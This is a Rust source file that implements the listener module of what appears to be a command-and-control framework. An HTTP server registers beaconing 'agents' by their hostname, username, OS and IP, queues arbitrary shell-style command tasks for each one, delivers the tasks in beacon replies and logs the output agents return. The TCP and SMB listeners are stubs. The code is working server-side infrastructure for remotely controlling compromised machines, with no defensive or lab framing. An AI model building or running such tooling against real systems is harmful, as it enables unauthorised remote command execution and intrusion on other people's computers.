// src/listener/mod.rs - Fixed with proper agent handling
use std::io;
use std::sync::{Arc, Mutex};
use std::thread;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{channel, Sender};
use std::collections::HashMap;
use serde::{Serialize, Deserialize};
use tokio::runtime::Runtime;
use std::time::{SystemTime, UNIX_EPOCH};
use lazy_static::lazy_static;

use crate::models::agent::Agent;

// Define messages for communication
enum ListenerMessage {
    Stop,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum ListenerType {
    Http,
    Https,
    Tcp,
    Smb,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListenerConfig {
    pub listener_type: ListenerType,
    pub host: String,
    pub port: u16,
}

// Agent beacon data structure
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BeaconData {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub ip: String,
    pub pid: u32,
}

// Task for agents
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentTask {
    pub id: String,
    pub command: String,
}

// Task result from agents
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskResult {
    pub id: String,
    pub result: String,
    pub success: bool,
}

// Global agent storage
lazy_static! {
    static ref GLOBAL_AGENTS: Arc<Mutex<HashMap<String, Agent>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref PENDING_TASKS: Arc<Mutex<HashMap<String, Vec<AgentTask>>>> = Arc::new(Mutex::new(HashMap::new()));
}

#[derive(Clone)]
pub struct Listener {
    pub config: ListenerConfig,
    running: Arc<AtomicBool>,
    tx: Arc<Mutex<Option<Sender<ListenerMessage>>>>,
}

impl Listener {
    pub fn new(config: ListenerConfig) -> Self {
        Listener {
            config,
            running: Arc::new(AtomicBool::new(false)),
            tx: Arc::new(Mutex::new(None)),
        }
    }
    
    pub fn start(&self) -> io::Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Ok(());
        }
        
        let (tx, rx) = channel::<ListenerMessage>();
        
        {
            let mut tx_guard = self.tx.lock().unwrap();
            *tx_guard = Some(tx);
        }
        
        self.running.store(true, Ordering::SeqCst);
        
        let config = self.config.clone();
        let running = self.running.clone();
        
        thread::spawn(move || {
            println!("Starting {:?} listener on {}:{}", config.listener_type, config.host, config.port);
            
            match config.listener_type {
                ListenerType::Http | ListenerType::Https => {
                    let rt = Runtime::new().unwrap();
                    rt.block_on(async {
                        if let Err(e) = start_http_server(&config, &running, &rx).await {
                            eprintln!("HTTP server error: {}", e);
                        }
                    });
                },
                ListenerType::Tcp => {
                    start_tcp_server(&config, &running, &rx);
                },
                ListenerType::Smb => {
                    start_smb_server(&config, &running, &rx);
                }
            }
            
            println!("{:?} listener stopped on {}:{}", config.listener_type, config.host, config.port);
        });
        
        Ok(())
    }
    
    pub fn stop(&self) -> io::Result<()> {
        if !self.running.load(Ordering::SeqCst) {
            return Ok(());
        }
        
        self.running.store(false, Ordering::SeqCst);
        
        let tx_guard = self.tx.lock().unwrap();
        if let Some(tx) = tx_guard.as_ref() {
            let _ = tx.send(ListenerMessage::Stop);
        }
        
        Ok(())
    }
    
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

impl Drop for Listener {
    fn drop(&mut self) {
        let _ = self.stop();
    }
}

// Public functions to manage agents and tasks
pub fn get_all_agents() -> Vec<Agent> {
    GLOBAL_AGENTS.lock().unwrap().values().cloned().collect()
}

pub fn add_task_for_agent(agent_id: &str, command: String) -> String {
    let task_id = format!("task-{}-{}", agent_id, 
        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs());
    
    let task = AgentTask {
        id: task_id.clone(),
        command,
    };
    
    let mut pending = PENDING_TASKS.lock().unwrap();
    pending.entry(agent_id.to_string()).or_insert_with(Vec::new).push(task);
    
    println!("Added task {} for agent {}", task_id, agent_id);
    task_id
}

async fn start_http_server(
    config: &ListenerConfig, 
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use std::net::SocketAddr;
    
    let addr: SocketAddr = format!("{}:{}", config.host, config.port)
        .parse()
        .map_err(|e| format!("Invalid address: {}", e))?;
    
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    println!("HTTP listener bound to {}", addr);
    
    loop {
        if !running.load(Ordering::SeqCst) {
            break;
        }
        
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        
        tokio::select! {
            result = listener.accept() => {
                match result {
                    Ok((stream, addr)) => {
                        println!("Connection from: {}", addr);
                        tokio::spawn(async move {
                            if let Err(e) = handle_http_connection(stream, addr).await {
                                eprintln!("Error handling connection: {}", e);
                            }
                        });
                    }
                    Err(e) => {
                        eprintln!("Failed to accept connection: {}", e);
                    }
                }
            }
            _ = tokio::time::sleep(tokio::time::Duration::from_millis(100)) => {
                // Timeout to check running flag
            }
        }
    }
    
    Ok(())
}

async fn handle_http_connection(
    mut stream: tokio::net::TcpStream,
    addr: std::net::SocketAddr
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    
    let mut buffer = [0; 4096];
    
    match stream.read(&mut buffer).await {
        Ok(0) => return Ok(()), // Connection closed
        Ok(n) => {
            let request = String::from_utf8_lossy(&buffer[..n]);
            println!("Received HTTP request from {}: {}", addr, request.lines().next().unwrap_or(""));
            
            if request.contains("POST /beacon") {
                handle_beacon_request(&mut stream, &request).await?;
            } else if request.contains("POST /task_result") {
                handle_task_result(&mut stream, &request).await?;
            } else {
                // Send 404 for unknown endpoints
                let response = "HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nNot Found";
                stream.write_all(response.as_bytes()).await?;
            }
        }
        Err(e) => {
            eprintln!("Error reading from connection: {}", e);
        }
    }
    
    Ok(())
}

async fn handle_beacon_request(
    stream: &mut tokio::net::TcpStream,
    request: &str
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::AsyncWriteExt;
    
    // Extract JSON from the request body
    if let Some(body_start) = request.find("\r\n\r\n") {
        let body = &request[body_start + 4..];
        
        match serde_json::from_str::<BeaconData>(body) {
            Ok(beacon) => {
                println!("Agent beacon: {} ({}@{})", beacon.id, beacon.username, beacon.hostname);
                
                // Update or create agent
                {
                    let mut agents = GLOBAL_AGENTS.lock().unwrap();
                    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
                    
                    if let Some(agent) = agents.get_mut(&beacon.id) {
                        // Update existing agent
                        agent.last_seen = now;
                    } else {
                        // Create new agent
                        let agent = Agent::new(
                            beacon.id.clone(),
                            beacon.hostname.clone(),
                            beacon.username.clone(),
                            beacon.os.clone(),
                            beacon.arch.clone(),
                            beacon.ip.clone()
                        );
                        agents.insert(beacon.id.clone(), agent);
                        println!("New agent registered: {}", beacon.id);
                    }
                }
                
                // Get pending tasks for this agent
                let tasks = {
                    let mut pending = PENDING_TASKS.lock().unwrap();
                    pending.remove(&beacon.id).unwrap_or_default()
                };
                
                // Send tasks as JSON response
                let tasks_json = serde_json::to_string(&tasks)?;
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
                    tasks_json.len(),
                    tasks_json
                );
                stream.write_all(response.as_bytes()).await?;
                
                if !tasks.is_empty() {
                    println!("Sent {} tasks to agent {}", tasks.len(), beacon.id);
                }
            }
            Err(e) => {
                eprintln!("Failed to parse beacon JSON: {}", e);
                let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                stream.write_all(response.as_bytes()).await?;
            }
        }
    } else {
        let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
        stream.write_all(response.as_bytes()).await?;
    }
    
    Ok(())
}

async fn handle_task_result(
    stream: &mut tokio::net::TcpStream,
    request: &str
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::AsyncWriteExt;
    
    // Extract JSON from the request body
    if let Some(body_start) = request.find("\r\n\r\n") {
        let body = &request[body_start + 4..];
        
        match serde_json::from_str::<TaskResult>(body) {
            Ok(result) => {
                println!("Task result: {} -> {}", result.id, 
                    if result.success { "SUCCESS" } else { "FAILED" });
                println!("Output: {}", result.result);
                
                // Here you could store the result in a database or update GUI
                // For now, just log it
                
                let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK";
                stream.write_all(response.as_bytes()).await?;
            }
            Err(e) => {
                eprintln!("Failed to parse task result JSON: {}", e);
                let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                stream.write_all(response.as_bytes()).await?;
            }
        }
    } else {
        let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
        stream.write_all(response.as_bytes()).await?;
    }
    
    Ok(())
}

fn start_tcp_server(
    _config: &ListenerConfig,
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) {
    while running.load(Ordering::SeqCst) {
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
}

fn start_smb_server(
    _config: &ListenerConfig,
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) {
    while running.load(Ordering::SeqCst) {
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
}